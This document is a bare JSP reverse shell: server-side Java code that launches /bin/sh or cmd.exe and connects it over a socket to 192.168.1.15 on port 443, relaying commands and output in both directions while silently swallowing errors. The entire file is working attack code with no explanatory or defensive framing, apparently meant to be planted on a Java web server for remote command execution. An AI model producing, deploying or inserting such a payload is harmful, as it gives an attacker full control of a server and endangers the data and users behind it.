<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream kw;
    OutputStream rx;

    StreamConnector( InputStream kw, OutputStream rx )
    {
      this.kw = kw;
      this.rx = rx;
    }

    public void run()
    {
      BufferedReader ca  = null;
      BufferedWriter orp = null;
      try
      {
        ca  = new BufferedReader( new InputStreamReader( this.kw ) );
        orp = new BufferedWriter( new OutputStreamWriter( this.rx ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ca.read( buffer, 0, buffer.length ) ) > 0 )
        {
          orp.write( buffer, 0, length );
          orp.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ca != null )
          ca.close();
        if( orp != null )
          orp.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.1.15", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
